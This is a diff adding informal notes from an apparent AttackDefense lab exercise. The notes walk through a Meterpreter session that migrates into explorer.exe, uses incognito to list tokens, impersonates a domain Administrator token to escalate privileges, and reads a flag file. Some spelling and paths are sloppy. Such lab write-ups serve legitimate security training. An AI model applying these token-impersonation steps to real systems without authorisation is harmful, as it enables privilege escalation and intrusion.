@@ -25,3 +25,42 @@ Architecture    : x64
 System Language : en_US
 Meterpreter     : x86/windows
 
+>pgrep explorer
+3500
+meterpreter > migrate 3500
+[*] Migrating from 4936 to 3500...
+[*] Migration completed successfully.
+getprivs to see the privileges
+SeImpersonatePrivilege //This process is enabled
+load incognito
+It will get success
+list_token
+meterpreter > list_tokens -u
+[-] Warning: Not currently running as SYSTEM, not all tokens will be available
+             Call rev2self if primary process token is SYSTEM
+
+Delegation Tokens Available
+========================================
+ATTACKDEFENSE\Administrator
+NT AUTHORITY\SYSTEM
+
+Impersonation Tokens Available
+========================================
+No tokens available
+
+
+now we will impersonate
+impersonate_token "ATTACKDEFENSE\Administrator"
+>getuid
+>pgrep explorer
+migrate pid
+getprivs
+getuid 
+now we eleveated privilages
+i find the flag in C:\Users\Administrators\Desktops\flag
+type C:\\Users\\Administrator\\Desktop\\flag.txt
+
+
+
+
+
